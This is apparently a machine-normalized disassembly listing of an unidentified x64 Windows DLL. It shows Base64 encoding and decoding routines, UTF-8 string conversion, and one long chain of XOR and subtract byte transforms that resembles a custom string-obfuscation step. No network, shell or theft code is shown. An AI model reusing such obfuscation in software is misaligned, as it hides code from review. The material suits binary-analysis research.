lea rdx [ rsp + 0x498 ]
mov rcx rsi
call sub_180009450
mov rcx [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rcx + 0xc ]
mov rdx rax
mov rcx rdi
call sub_180004760
jmp r-xdata
mov [ rsp + 0xe8 ] 0xf
mov [ rsp + 0xe0 ] r14
mov [ rsp + 0xd0 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x628 ]
lea rcx [ rsp + 0xd0 ]
call sub_180003a40
mov rax [ r13 ]
mov [ rsp + 0x20 ] 0x64
mov r9b 0x1
mov r8d [ rax + 0xc ]
lea rdx [ rsp + 0xd0 ]
mov rcx rdi
call sub_180004760
jmp r-xdata
mov rcx r12
call j_sub_18001c80c
jmp r-xdata
call sub_18001c80c
mov rcx r15
call j_sub_18001c80c
jmp r-xdata
call sub_18001c80c
mov rcx [ r15 ]
test rcx rcx
je r-xdata
mov [ rsp + 0x20 ] r14
xor r9d r9d
call sub_180003530
test r12 r12
je r-xdata
sub_180008540
movzx eax dl
movzx r9d r8b
sub eax 0xfd
and eax 0x800000ff
jge r-xdata
movzx eax al
xor eax 0xbe
and eax 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx ecx al
sub ecx 0x42
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
sub eax 0x62
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
sub ecx 0x46
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0xf0
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
xor ecx 0x1b
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0x90
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
xor ecx 0x71
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
sub eax 0x6c
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
sub ecx r9d
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
sub eax 0x35
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
xor ecx 0xa2
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0x47
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
sub ecx 0x50
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0x44
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
xor ecx 0xa8
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0x9d
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
sub ecx 0xc5
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0xdd
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
sub ecx 0x7f
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax r9d
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx eax al
sub eax 0xd7
and eax 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx ecx al
xor ecx 0xb0
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0x9f
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
sub ecx 0xc8
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0xcc
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
xor ecx 0x4b
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0x9b
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx ecx al
sub ecx 0xc7
and ecx 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax cl
xor eax 0xba
and eax 0x800000ff
jge r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx eax al
sub eax 0x19
and eax 0x800000ff
jge r-xdata
dec eax
or eax 0xffffff00
inc eax
retn
dec eax
or eax 0xffffff00
inc eax
sub_180008890
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x20 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
call sub_18001c80c
add rsp 0x20
pop rbx
retn
call sub_18001c80c
sub_1800088e0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi [ rcx ]
mov rdi rcx
test rsi rsi
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
xor eax eax
add rsp 0x20
pop rdi
retn
mov rbx [ rcx + 0x8 ]
test rbx rbx
je r-xdata
lea rcx [ rbx + 0x2 ]
mov edx 0x1
mov [ rsp + 0x30 ] rbp
call sub_18001d210
mov rbp rax
test rax rax
jne r-xdata
dec rbx
je r-xdata
mov rbp [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi + 0x10 ]
movzx edx [ rsi ]
mov rcx rdi
movzx r8d [ rax ]
call sub_180008540
mov [ rbp ] al
mov rax rbp
jmp r-xdata
nop [ rax + rax ] eax
movzx r8d [ rsi + rbx - 0x1 ]
movzx edx [ rsi + rbx ]
mov rcx rdi
call sub_180008540
dec rbx
mov [ rbx + rbp + 0x1 ] al
jne r-xdata
sub_180008990
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
movzx edi dl
mov edx 0x1
call sub_18001d210
mov r9b 0x61
mov r11 rax
mov r10 rax
mov eax 0x1a
nop
lea r8d [ r9 - 0x20 ]
mov [ r10 + 0x1a ] r9b
inc r10
mov [ r10 - 0x1 ] r8b
inc r9b
dec rax
jne r-xdata
xor cl cl
lea rdx [ r11 + 0x34 ]
nop [ rax ] eax
lea eax [ rcx + 0x30 ]
inc cl
inc rdx
mov [ rdx - 0x1 ] al
cmp cl 0xa
jl r-xdata
cmp dil [ rw-data ]
jne r-xdata
cmp dil [ rw-data ]
jne r-xdata
mov [ r11 + 0x3e ] 0x5f2d
mov [ rbx + 0x28 ] r11
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ r11 + 0x3e ] 0x2f2b
mov [ rbx + 0x20 ] r11
sub_180008a30
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov r12d [ rw-data ]
lea rsi [ r8 + r8 + 0x8000 ]
xor ebp ebp
mov r15 rdx
and rsi 0xffffffffffff8000
lea edx [ rbp + 0x1 ]
add rsi 0x8000
mov rbx r9
mov r14 r8
lea rcx [ r12 + rsi ]
mov r13d ebp
call sub_18001d210
mov [ rbx ] rbp
mov rdi rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rsp + 0x70 ]
add rsi rax
mov r8 r12
mov rcx rsi
call sub_18001c4a0
mov r11d 0x4
cmp r14 0x3
jb r-xdata
test r14 r14
je r-xdata
mov rax 0xaaaaaaaaaaaaaaab
mul r14
mov r10 rdx
shr r10 0x1
mov rax r10
imul rax rax 0xfffffffffffffffd
add r14 rax
nop
mov rax rdi
cmp r14 0x1
jbe r-xdata
mov rcx [ rbx ]
mov rax rdx
shr rdx 0x6
sub rcx r8
and eax 0x3f
inc r8
dec r9
movzx eax [ rax + rsi ]
mov [ rcx + rdi + 0x3 ] al
jne r-xdata
add [ rbx ] r11
dec r10
jne r-xdata
movzx edx [ r13 + r15 ]
shl rdx 0x10
nop [ rax + rax ] ax
movzx eax [ r13 + r15 ]
movzx edx [ r13 + r15 + 0x1 ]
shl rax 0x8
add rdx rax
shl rdx 0x8
jmp r-xdata
movzx eax [ r13 + r15 ]
movzx ecx [ r13 + r15 + 0x1 ]
movzx edx [ r13 + r15 + 0x2 ]
shl rax 0x8
mov r8 rbp
mov r9 r11
xor rcx rax
shl rcx 0x8
xor rdx rcx
add r13 0x3
nop [ rax + rax ] ax
mov rcx [ rbx ]
mov rax rdx
shr rdx 0x6
sub rcx rbp
and eax 0x3f
inc rbp
dec r11
movzx eax [ rax + rsi ]
mov [ rcx + rdi + 0x3 ] al
jne r-xdata
mov rax [ rbx ]
mov [ rax + rdi + 0x3 ] 0x3d
cmp r14 0x1
jne r-xdata
add [ rbx ] 0x4
mov rax [ rbx ]
mov [ rax + rdi + 0x2 ] 0x3d
sub_180008bc0
push rbp
push rsi
push r12
sub rsp 0x20
mov rbp r9
mov r12 r8
mov rsi rdx
test r8b 0x3
je r-xdata
mov [ rsp + 0x40 ] rbx
mov edx 0x1
mov ecx 0x100
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x50 ] r13
call sub_18001d210
mov r8 [ rsp + 0x60 ]
xor dl dl
mov rbx rax
nop [ rax + rax ] eax
xor eax eax
add rsp 0x20
pop r12
pop rsi
pop rbp
retn
movsx rcx [ r8 ]
inc r8
mov [ rcx + rax ] dl
inc dl
cmp dl 0x40
jb r-xdata
mov rcx r12
shr rcx 0x2
cmp [ rsi + r12 - 0x1 ] 0x3d
lea rdi [ rcx + rcx * 2 ]
jne r-xdata
cmp [ rsi + r12 - 0x2 ] 0x3d
jne r-xdata
dec rdi
mov edx 0x1
mov rcx rdi
mov [ rbp ] rdi
call sub_18001d210
mov r13 rax
test rax rax
jne r-xdata
dec rdi
xor ecx ecx
xor r8d r8d
test r12 r12
je r-xdata
mov rcx rbx
call sub_18001c80c
xor eax eax
jmp r-xdata
mov rcx rbx
call sub_18001c80c
mov rax r13
mov rdx rax
nop [ rax + rax ] eax
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov r13 [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rsi
pop rbp
retn
movsx rax r9b
movsx r9d [ rax + rbx ]
xor r9d r9d
jmp r-xdata
movsx rax r10b
movsx ebp [ rax + rbx ]
xor ebp ebp
jmp r-xdata
inc ecx
movzx r10d [ rcx + rsi ]
cmp r10b 0x3d
jne r-xdata
movsx rax r10b
movsx r11d [ rax + rbx ]
xor r11d r11d
jmp r-xdata
inc ecx
movzx r10d [ rcx + rsi ]
cmp r10b 0x3d
jne r-xdata
movsx rax r10b
movsx eax [ rax + rbx ]
xor eax eax
jmp r-xdata
inc ecx
movzx r10d [ rcx + rsi ]
cmp r10b 0x3d
jne r-xdata
mov eax r8d
cmp rax rdi
jae r-xdata
mov eax r9d
inc r8d
sar eax 0x10
inc rdx
mov [ rdx - 0x1 ] al
shl r9d 0x6
inc ecx
add r9d ebp
shl r9d 0x6
add r9d r11d
shl r9d 0x6
add r9d eax
mov eax r8d
cmp rax rdi
jae r-xdata
mov eax r8d
cmp rax rdi
jae r-xdata
mov eax r9d
inc r8d
sar eax 0x8
inc rdx
mov [ rdx - 0x1 ] al
mov eax ecx
cmp rax r12
jb r-xdata
mov [ rdx ] r9b
inc r8d
inc rdx
movzx r9d [ rcx + rsi ]
cmp r9b 0x3d
jne r-xdata
sub_180008d70
push rbp
push rsi
push r12
sub rsp 0x20
mov rbp r9
mov r12 r8
mov rsi rdx
test r8b 0x3
je r-xdata
mov [ rsp + 0x40 ] rbx
mov edx 0x2
mov ecx 0x100
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x50 ] r13
call sub_18001d210
mov r9 [ rsp + 0x60 ]
xor r8b r8b
mov rbx rax
nop [ rax ] eax
xor eax eax
add rsp 0x20
pop r12
pop rsi
pop rbp
retn
movsx rcx [ r9 ]
movzx edx r8b
inc r8b
inc r9
mov [ rax + rcx * 2 ] dx
cmp r8b 0x40
jb r-xdata
mov rax r12
shr rax 0x2
lea rdi [ rax + rax * 2 ]
lea rax [ r12 - 0x2 ]
shr rax 0x1
shr rdi 0x1
cmp [ rsi + rax * 2 ] 0x3d
jne r-xdata
lea rax [ r12 - 0x4 ]
shr rax 0x1
cmp [ rsi + rax * 2 ] 0x3d
jne r-xdata
dec rdi
mov edx 0x2
mov rcx rdi
mov [ rbp ] rdi
call sub_18001d210
mov r13 rax
test rax rax
jne r-xdata
dec rdi
xor ecx ecx
xor r8d r8d
shr r12 0x1
je r-xdata
mov rcx rbx
call sub_18001c80c
xor eax eax
jmp r-xdata
mov rcx rbx
call sub_18001c80c
mov rax r13
mov [ rsp + 0x58 ] r14
mov r9 rax
mov r14d 0xff
nop
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov r13 [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rsi
pop rbp
retn
movzx eax dx
movzx edx [ rbx + rax * 2 ]
xor edx edx
jmp r-xdata
movzx eax r10w
movzx ebp [ rbx + rax * 2 ]
xor ebp ebp
jmp r-xdata
inc ecx
movzx r10d [ rsi + rcx * 2 ]
cmp r10w 0x3d
jne r-xdata
movzx eax r10w
movzx r11d [ rbx + rax * 2 ]
xor r11d r11d
jmp r-xdata
inc ecx
movzx r10d [ rsi + rcx * 2 ]
cmp r10w 0x3d
jne r-xdata
movzx eax r10w
movzx eax [ rbx + rax * 2 ]
xor eax eax
jmp r-xdata
inc ecx
movzx r10d [ rsi + rcx * 2 ]
cmp r10w 0x3d
jne r-xdata
mov eax r8d
cmp rax rdi
jae r-xdata
mov eax edx
inc r8d
sar eax 0x10
and ax r14w
add r9 0x2
mov [ r9 - 0x2 ] ax
shl edx 0x6
inc ecx
add edx ebp
shl edx 0x6
add edx r11d
shl edx 0x6
add edx eax
mov eax r8d
cmp rax rdi
jae r-xdata
mov eax r8d
cmp rax rdi
jae r-xdata
mov eax edx
inc r8d
sar eax 0x8
and ax r14w
add r9 0x2
mov [ r9 - 0x2 ] ax
mov eax ecx
cmp rax r12
jb r-xdata
and dx r14w
inc r8d
add r9 0x2
mov [ r9 - 0x2 ] dx
movzx edx [ rsi + rcx * 2 ]
cmp dx 0x3d
jne r-xdata
mov r14 [ rsp + 0x58 ]
sub_180008f60
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rcx + 0x28 ] 0x0
mov rdi r9
mov rsi r8
mov rbp rdx
mov rbx rcx
jne r-xdata
mov rax [ rbx + 0x28 ]
mov r9 rdi
mov r8 rsi
mov rdx rbp
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180008bc0
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
movzx edx [ rw-data ]
call sub_180008990
sub_180008fd0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rcx + 0x28 ] 0x0
mov rdi r9
mov rsi r8
mov rbp rdx
mov rbx rcx
jne r-xdata
mov rax [ rbx + 0x28 ]
mov r9 rdi
mov r8 rsi
mov rdx rbp
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180008a30
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
movzx edx [ rw-data ]
call sub_180008990
sub_180009040
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rcx + 0x20 ] 0x0
mov rdi r9
mov rsi r8
mov rbp rdx
mov rbx rcx
jne r-xdata
mov rax [ rbx + 0x20 ]
mov r9 rdi
mov r8 rsi
mov rdx rbp
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180008bc0
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
movzx edx [ rw-data ]
call sub_180008990
sub_1800090b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rcx + 0x20 ] 0x0
mov rdi r9
mov rsi r8
mov rbp rdx
mov rbx rcx
jne r-xdata
mov rax [ rbx + 0x20 ]
mov r9 rdi
mov r8 rsi
mov rdx rbp
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180008d70
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
movzx edx [ rw-data ]
call sub_180008990
sub_180009120
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov r8 [ rcx + 0x18 ]
cmp r8 0x10
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov r8 [ rbx + 0x10 ]
mov rdx rdi
mov rcx rbx
call sub_180003380
test rdi rdi
je r-xdata
cmp r8 0x10
jb r-xdata
cmp rdx rax
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rcx [ rbx + 0x10 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx ] 0x0
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx ]
mov [ rax ] dil
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp r8 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov r8 rdi
mov rdx rsi
call sub_18001c4a0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi ] 0x0
sub rsi rax
mov r9 rdi
mov rdx rbx
mov r8 rsi
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180003a40
sub_180009250
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
cmp [ rdi + 0x18 ] 0x10
jae r-xdata
mov rcx [ rcx ]
call j_sub_18001c80c
mov rax [ rdi ]
mov [ rbx ] rax
mov [ rdi ] 0x0
mov r8 [ rdi + 0x10 ]
mov rdx rdi
mov rcx rbx
inc r8
call sub_18001c4a0
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rdi + 0x18 ] 0xf
mov [ rdi + 0x10 ] 0x0
mov [ rdi ] 0x0
sub_1800092e0
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x60
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x58 ] rax
mov rbx rdx
xor r12d r12d
mov [ rsp + 0x20 ] r12d
call sub_1800088e0
mov rbp rax
lea esi [ r12 + 0x7 ]
test rax rax
jne r-xdata
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x30 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rbp
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rbp
lea rcx [ rsp + 0x30 ]
call sub_180003b50
nop
mov rcx rbp
call sub_18001c80c
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
lea rax [ rsp + 0x30 ]
cmp rbx rax
je r-xdata
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
xor r8d r8d
lea rdx [ r--data ]
mov rcx rbx
call sub_180003b50
jmp r-xdata
mov rsi [ rsp + 0x48 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rcx [ rsp + 0x58 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov rcx [ rsp + 0x30 ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
mov rcx [ rsp + 0x48 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov rax [ rsp + 0x30 ]
mov [ rbx ] rax
mov [ rsp + 0x30 ] r12
mov r8 [ rsp + 0x40 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_18001c4a0
mov rcx [ rsp + 0x48 ]
jmp r-xdata
cmp rsi 0x8
jb r-xdata
mov rax [ rsp + 0x40 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x30 ] r12w
jmp r-xdata
sub_180009450
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x60
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x58 ] rax
mov rbx rdx
xor r12d r12d
mov [ rsp + 0x20 ] r12d
call sub_1800088e0
mov rbp rax
lea esi [ r12 + 0xf ]
test rax rax
jne r-xdata
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x30 ] r12b
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rbp
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rbp
lea rcx [ rsp + 0x30 ]
call sub_180009120
nop
mov rcx rbp
call sub_18001c80c
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r12
mov [ rbx ] 0x0
lea rax [ rsp + 0x30 ]
cmp rbx rax
je r-xdata
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12b
xor r8d r8d
lea rdx [ r--data ]
mov rcx rbx
call sub_180009120
jmp r-xdata
mov rsi [ rsp + 0x48 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rbx
mov rcx [ rsp + 0x58 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov rcx [ rsp + 0x30 ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] rsi
mov [ rbx + 0x10 ] r12
mov [ rbx ] 0x0
mov rcx [ rsp + 0x48 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov rax [ rsp + 0x30 ]
mov [ rbx ] rax
mov [ rsp + 0x30 ] r12
mov r8 [ rsp + 0x40 ]
inc r8
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_18001c4a0
mov rcx [ rsp + 0x48 ]
jmp r-xdata
cmp rsi 0x10
jb r-xdata
mov rax [ rsp + 0x40 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x30 ] 0x0
jmp r-xdata
sub_1800095b0
push rbx
sub rsp 0x20
mov rax rdx
mov rbx rcx
lea rdx [ rw-data ]
mov rcx rax
call sub_18001c9c0
test al al
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
lea rax [ rbx + 0x18 ]
add rsp 0x20
pop rbx
retn
sub_180009600
mov r8 [ rcx + 0x10 ]
mov r9 rdx
mov rax 0x6666666666666667
sub r8 [ rcx ]
imul r8
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
mov rax 0x666666666666666
mov rcx rdx
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
cmp rdx r9
cmovb rdx r9
mov rax rdx
retn
xor edx edx
cmp rdx r9
cmovb rdx r9
mov rax rdx
retn
sub_180009660
push rbx
sub rsp 0x20
mov rbx [ rcx + 0x8 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
[ rbx + 0x8 ]
mov [ rsp + 0x30 ] rdi
jne r-xdata
mov rdi [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_1800096a0
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
mov ecx 0x20
call sub_18001c84c
test rax rax
je r-xdata
mov r8 rax
mov rdx rbx
mov rcx rdi
call sub_1800011a0
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rax + 0x8 ] 0x1
mov [ rax + 0xc ] 0x1
lea rcx [ r--data ]
mov [ rax ] rcx
mov [ rax + 0x10 ] rbx
sub_180009710
mov r11 rsp
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x80
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rbx rdx
mov rbp rcx
mov [ r11 - 0x48 ] rcx
mov [ r11 - 0x40 ] rdx
xor r13d r13d
mov [ r11 - 0x64 ] r13d
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
mov r8 rdx
mov r8 [ rdx ]
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx r12
call sub_18001c9f0
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbp + 0x18 ] 0xf
mov [ rbp + 0x10 ] r13
mov [ rbp ] r12b
xor r8d r8d
lea rdx [ r--data ]
mov rcx rbp
call sub_180009120
mov [ rsp + 0x44 ] 0x1
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] r13
or rsi 0xffffffffffffffff
mov r9d esi
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
movsxd rdi eax
add rdi 0x2
mov rcx rdi
call j_sub_18001c84c
mov [ rsp + 0x48 ] r13
mov [ rsp + 0x50 ] r13
movzx r8d [ rsp + 0x40 ]
mov rdx rax
lea rcx [ rsp + 0x48 ]
call sub_1800096a0
nop
mov r12 [ rsp + 0x48 ]
test r12 r12
jne r-xdata
mov r8 rbx
mov r8 [ rbx ]
jmp r-xdata
jmp r-xdata
[ rcx + 0x8 ]
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
[ rcx + 0x8 ]
jne r-xdata
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] r12
mov r9d [ rbx + 0x10 ]
xor edx edx
mov ecx 0xfde9
call [ WideCharToMultiByte@IAT ]
mov [ rbp + 0x18 ] 0xf
mov [ rbp + 0x10 ] r13
mov [ rbp ] 0x0
xor eax eax
mov rcx rsi
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
mov rcx rbp
call sub_180009120
mov [ rsp + 0x44 ] 0x1
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
mov rdi [ rsp + 0x50 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov rax rbp
mov [ rbx ] r13w
